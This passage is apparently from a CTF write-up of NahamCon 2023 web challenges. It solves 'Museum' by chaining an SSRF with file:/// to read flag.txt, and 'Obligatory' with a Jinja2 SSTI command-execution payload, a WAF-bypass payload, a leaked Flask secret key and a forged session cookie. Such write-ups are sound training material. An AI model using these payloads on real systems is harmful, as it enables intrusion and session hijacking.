+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Please specify the artifact to view.&#34;</span><span class="p">,</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">artifact_error</span> <span class="o">=</span> <span class="s2">&#34;&lt;h1&gt;Artifact not found.&lt;/h1&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;..&#34;</span> <span class="ow">in</span> <span class="n">file_name</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">artifact_error</span><span class="p">,</span> <span class="mi">404</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">file_name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;/&#39;</span> <span class="ow">and</span> <span class="n">file_name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">isalpha</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">artifact_error</span><span class="p">,</span> <span class="mi">404</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="s2">&#34;public&#34;</span><span class="p">,</span> <span class="n">file_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">artifact_error</span><span class="p">,</span> <span class="mi">404</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;flag.txt&#39;</span> <span class="ow">in</span> <span class="n">file_path</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Sorry, sensitive artifacts are not made visible to the public!&#34;</span><span class="p">,</span> <span class="mi">404</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">image_types</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;jpg&#39;</span><span class="p">,</span> <span class="s1">&#39;png&#39;</span><span class="p">,</span> <span class="s1">&#39;gif&#39;</span><span class="p">,</span> <span class="s1">&#39;jpeg&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">file_name</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;.&#34;</span> <span class="o">+</span> <span class="n">image_type</span><span class="p">)</span> <span class="k">for</span> <span class="n">image_type</span> <span class="ow">in</span> <span class="n">image_types</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">is_image</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">is_image</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;view.html&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="n">file_name</span><span class="p">,</span> <span class="n">is_image</span><span class="o">=</span><span class="n">is_image</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/submit&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">submit</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;submit.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/private_submission_fetch&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">private_submission_fetch</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;URL is required.&#34;</span><span class="p">,</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">submission_fetch</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">submission_fetch</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlretrieve</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/private_submission&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">private_submission</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span> <span class="o">!=</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;submit&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file_name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;filename&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">file_name</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Please specify a URL and a file name.&#34;</span><span class="p">,</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">submission_fetch</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="s1">&#39;public&#39;</span><span class="p">,</span> <span class="n">file_name</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">),</span> <span class="mi">500</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;Submission received.&#34;</span><span class="p">,</span> <span class="mi">200</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The interesting part is the following routes <code>/private_submission_fetch</code> and <code>/private_submission</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/private_submission_fetch&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">private_submission_fetch</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;URL is required.&#34;</span><span class="p">,</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">submission_fetch</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">submission_fetch</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlretrieve</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/private_submission&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">private_submission</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span> <span class="o">!=</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;submit&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file_name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;filename&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">file_name</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Please specify a URL and a file name.&#34;</span><span class="p">,</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">submission_fetch</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="s1">&#39;public&#39;</span><span class="p">,</span> <span class="n">file_name</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">),</span> <span class="mi">500</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;Submission received.&#34;</span><span class="p">,</span> <span class="mi">200</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <code>/private_submission_fetch</code> route takes in a <code>url</code> and fetches that page using <code>urllib.request.urlretrieve</code>. This basically downloads a file from the provided URL and saves it on the specified path locally.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>urllib.request.urlretrieve<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">In Python, the urllib.request.urlretrieve function is part of the urllib.request module. It is used to retrieve files from the web by downloading them to the local file system.</div>
+        </div>
+    </div>
+<p>Since this <code>submission_fetch</code> takes in any URL without any validation, it is potentially vulnerable to SSRF.</p>
+<p>We can test this using <code>webhook.site</code>.</p>
+<p>Example URL: <a href="http://challenge.nahamcon.com:31033/private_submission_fetch?url=https://webhook.site/de647687-2568-4ea5-bd46-0592eb80626c" target="_blank" rel="noopener noreffer ">http://challenge.nahamcon.com:31033/private_submission_fetch?url=https://webhook.site/de647687-2568-4ea5-bd46-0592eb80626c</a></p>
+<p>The webpage shows 500 Internal Server Error but we get response back on webhook.site.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/10.png" title="webhook.site response" data-thumbnail="/nahamcon2023-web/10.png" data-sub-html="<h2>webhook.site response</h2><p>webhook.site response</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/10.png"
+            data-srcset="/nahamcon2023-web/10.png, /nahamcon2023-web/10.png 1.5x, /nahamcon2023-web/10.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/10.png" width="1366" height="437" />
+    </a><figcaption class="image-caption">webhook.site response</figcaption>
+    </figure></p>
+<p>This confirms the SSRF.</p>
+<p>The next thing to target is the <code>/private_submission</code> route. This only takes requests from <code>127.0.0.1</code> so we need to note that. This route basically takes in a URL and a filename and saves the file into the public folder where all the other images are stored.</p>
+<p>We can take advantage of this, by leveraging the SSRF from <code>/private_submission_fetch</code> and then calling <code>/private_submission</code> from <code>127.0.0.1</code>. After that, fetch the <code>flag.txt</code> and save it in the <code>public</code> folder.</p>
+<p>Final URL: <a href="http://challenge.nahamcon.com:31033/private_submission_fetch?url=http%3a//127.0.0.1%3a5000/private_submission%3furl%3dfile:///flag.txt%26filename%3dsaad.txt" target="_blank" rel="noopener noreffer ">http://challenge.nahamcon.com:31033/private_submission_fetch?url=http%3a//127.0.0.1%3a5000/private_submission%3furl%3dfile:///flag.txt%26filename%3dsaad.txt</a></p>
+<p>We call the <code>127.0.0.1:5000/private_submission</code> from the SSRF in <code>/private_submission_fetch</code> then fetch the <code>flag.txt</code> using <code>file:///</code> and save it locally as <code>saad.txt</code> in <code>public</code> folder.</p>
+<p>Retrieve the flag from: <a href="http://challenge.nahamcon.com:31033/public/saad.txt" target="_blank" rel="noopener noreffer ">http://challenge.nahamcon.com:31033/public/saad.txt</a></p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/11.png" title="Museum Flag" data-thumbnail="/nahamcon2023-web/11.png" data-sub-html="<h2>Museum Flag</h2><p>Museum Flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/11.png"
+            data-srcset="/nahamcon2023-web/11.png, /nahamcon2023-web/11.png 1.5x, /nahamcon2023-web/11.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/11.png" width="1366" height="207" />
+    </a><figcaption class="image-caption">Museum Flag</figcaption>
+    </figure></p>
+<p><code>Flag: flag{c3d727275bee25a40fae2d2d2fba9d70}</code></p>
+<h2 id="obligatory">Obligatory</h2>
+<p><strong>Description</strong></p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/12.png" title="Obligatory" data-thumbnail="/nahamcon2023-web/12.png" data-sub-html="<h2>Obligatory</h2><p>Obligatory</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/12.png"
+            data-srcset="/nahamcon2023-web/12.png, /nahamcon2023-web/12.png 1.5x, /nahamcon2023-web/12.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/12.png" width="1068" height="291" />
+    </a><figcaption class="image-caption">Obligatory</figcaption>
+    </figure></p>
+<p><strong>Solution</strong></p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/13.png" title="Landing Page" data-thumbnail="/nahamcon2023-web/13.png" data-sub-html="<h2>Landing Page</h2><p>Landing Page</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/13.png"
+            data-srcset="/nahamcon2023-web/13.png, /nahamcon2023-web/13.png 1.5x, /nahamcon2023-web/13.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/13.png" width="1366" height="581" />
+    </a><figcaption class="image-caption">Landing Page</figcaption>
+    </figure></p>
+<p>This application provides a basic sign in and sign up feature. We can make an account to login.</p>
+<p>Upon logging in, we can see a basic todo app. Creating a new task, it creates a new task and displays the text <code>Task Created</code>.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/14.png" title="Todo App" data-thumbnail="/nahamcon2023-web/14.png" data-sub-html="<h2>Todo App</h2><p>Todo App</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/14.png"
+            data-srcset="/nahamcon2023-web/14.png, /nahamcon2023-web/14.png 1.5x, /nahamcon2023-web/14.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/14.png" width="1366" height="587" />
+    </a><figcaption class="image-caption">Todo App</figcaption>
+    </figure></p>
+<p>Notice that upon changing the <code>success</code> parameter, whatever we put into it, it reflects back on the page.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/15.png" title="test" data-thumbnail="/nahamcon2023-web/15.png" data-sub-html="<h2>test</h2><p>test</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/15.png"
+            data-srcset="/nahamcon2023-web/15.png, /nahamcon2023-web/15.png 1.5x, /nahamcon2023-web/15.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/15.png" width="1366" height="590" />
+    </a><figcaption class="image-caption">test</figcaption>
+    </figure></p>
+<p>There can be a number of vulnerabilities we can test, one of them is SSTI.</p>
+<p>Adding a simple SSTI payload for Jinja2: {{7*7}}</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/16.png" title="SSTI works" data-thumbnail="/nahamcon2023-web/16.png" data-sub-html="<h2>SSTI works</h2><p>SSTI works</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/16.png"
+            data-srcset="/nahamcon2023-web/16.png, /nahamcon2023-web/16.png 1.5x, /nahamcon2023-web/16.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/16.png" width="1365" height="529" />
+    </a><figcaption class="image-caption">SSTI works</figcaption>
+    </figure></p>
+<p>As simple as that we can try a payload from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2" target="_blank" rel="noopener noreffer ">PayloadAllTheThings</a> to get the command execution.</p>
+<p>Payload: <code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}</code></p>
+<p>But to our surprise, it blocks certain commands using a blacklist.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/17.png" title="WAF" data-thumbnail="/nahamcon2023-web/17.png" data-sub-html="<h2>WAF</h2><p>WAF</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/17.png"
+            data-srcset="/nahamcon2023-web/17.png, /nahamcon2023-web/17.png 1.5x, /nahamcon2023-web/17.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/17.png" width="1366" height="252" />
+    </a><figcaption class="image-caption">WAF</figcaption>
+    </figure></p>
+<p>Trying some WAF bypass payloads, we get one working as follows.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/18.png" title="WAF Bypass Payload" data-thumbnail="/nahamcon2023-web/18.png" data-sub-html="<h2>WAF Bypass Payload</h2><p>WAF Bypass Payload</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/18.png"
+            data-srcset="/nahamcon2023-web/18.png, /nahamcon2023-web/18.png 1.5x, /nahamcon2023-web/18.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/18.png" width="1366" height="574" />
+    </a><figcaption class="image-caption">WAF Bypass Payload</figcaption>
+    </figure></p>
+<p>We can use the <code>self.__dict__</code> to get the dictionary that holds the attributes and their corresponding values for an instance of the current class.</p>
+<p>To bypass the WAF, we&rsquo;ll use the following payload.</p>
+<p>Payload: <code>{{self|attr('\x5f\x5fdict\x5f\x5f')}}</code></p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/19.png" title="self.&lt;strong&gt;dict&lt;/strong&gt;" data-thumbnail="/nahamcon2023-web/19.png" data-sub-html="<h2>self.__dict__</h2><p>self.&lt;strong&gt;dict&lt;/strong&gt;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/19.png"
+            data-srcset="/nahamcon2023-web/19.png, /nahamcon2023-web/19.png 1.5x, /nahamcon2023-web/19.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/19.png" width="1366" height="543" />
+    </a><figcaption class="image-caption">self.__dict__</figcaption>
+    </figure></p>
+<p>Here we get the secret key being used in the flask login session.</p>
+<p><code>Secret Key: &amp;GTHN&amp;Ngup3WqNm6q$5nPGSAoa7SaDuY</code></p>
+<p>We can use flask-unsign to decode the current <code>auth-token</code> cookie.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/20.png" title="Auth-Token" data-thumbnail="/nahamcon2023-web/20.png" data-sub-html="<h2>Auth-Token</h2><p>Auth-Token</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/20.png"
+            data-srcset="/nahamcon2023-web/20.png, /nahamcon2023-web/20.png 1.5x, /nahamcon2023-web/20.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/20.png" width="611" height="55" />
+    </a><figcaption class="image-caption">Auth-Token</figcaption>
+    </figure></p>
+<p>It shows that our <code>id</code> is <code>2</code>, indicating that there&rsquo;s another user with <code>id=1</code>.</p>
+<p>We can sign a new cookie with <code>id=1</code> as we have the secret key.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/21.png" title="Signing a new cookie" data-thumbnail="/nahamcon2023-web/21.png" data-sub-html="<h2>Signing a new cookie</h2><p>Signing a new cookie</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/21.png"
+            data-srcset="/nahamcon2023-web/21.png, /nahamcon2023-web/21.png 1.5x, /nahamcon2023-web/21.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/21.png" width="749" height="65" />
+    </a><figcaption class="image-caption">Signing a new cookie</figcaption>
+    </figure></p>
+<p>Updating the session cookie, we get the flag.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/22.png" title="Obligatory Flag" data-thumbnail="/nahamcon2023-web/22.png" data-sub-html="<h2>Obligatory Flag</h2><p>Obligatory Flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/22.png"
+            data-srcset="/nahamcon2023-web/22.png, /nahamcon2023-web/22.png 1.5x, /nahamcon2023-web/22.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/22.png" width="1366" height="543" />
+    </a><figcaption class="image-caption">Obligatory Flag</figcaption>
+    </figure></p>
+<p><code>Flag: flag{7b5b91c60796488148ddf3b227735979}</code></p>
+<h2 id="marmalade-5">Marmalade 5</h2>
+<p><strong>Description</strong></p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/23.png" title="Marmalade 5" data-thumbnail="/nahamcon2023-web/23.png" data-sub-html="<h2>Marmalade 5</h2><p>Marmalade 5</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/23.png"
+            data-srcset="/nahamcon2023-web/23.png, /nahamcon2023-web/23.png 1.5x, /nahamcon2023-web/23.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/23.png" width="1063" height="385" />
+    </a><figcaption class="image-caption">Marmalade 5</figcaption>
+    </figure></p>
+<p><strong>Solution</strong></p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/24.png" title="Landing Page" data-thumbnail="/nahamcon2023-web/24.png" data-sub-html="<h2>Landing Page</h2><p>Landing Page</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/24.png"
+            data-srcset="/nahamcon2023-web/24.png, /nahamcon2023-web/24.png 1.5x, /nahamcon2023-web/24.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/24.png" width="1366" height="319" />
+    </a><figcaption class="image-caption">Landing Page</figcaption>
+    </figure></p>
+<p>The landing page asks us for a username and then takes us to the following page.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/25.png" title="Logged in as saad" data-thumbnail="/nahamcon2023-web/25.png" data-sub-html="<h2>Logged in as saad</h2><p>Logged in as saad</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/25.png"
+            data-srcset="/nahamcon2023-web/25.png, /nahamcon2023-web/25.png 1.5x, /nahamcon2023-web/25.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/25.png" width="1366" height="485" />
+    </a><figcaption class="image-caption">Logged in as saad</figcaption>
+    </figure></p>
